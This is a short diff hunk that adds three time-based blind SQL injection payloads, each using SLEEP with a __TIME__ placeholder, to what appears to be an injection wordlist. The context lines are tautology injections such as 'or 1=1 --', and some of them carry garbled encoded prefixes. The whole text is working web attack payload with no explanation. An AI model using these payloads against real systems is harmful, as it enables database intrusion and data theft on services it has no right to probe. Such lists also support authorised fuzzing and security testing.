@@ -266,3 +266,6 @@ x' or 1=1 or 'x'='y
 Ã½ or 1=1 --
 â or 1=1 --
 â or 3=3 --
+"' OR SLEEP(__TIME__)-- "
+"') OR SLEEP(__TIME__)-- "
+"%' OR SLEEP(__TIME__)-- "
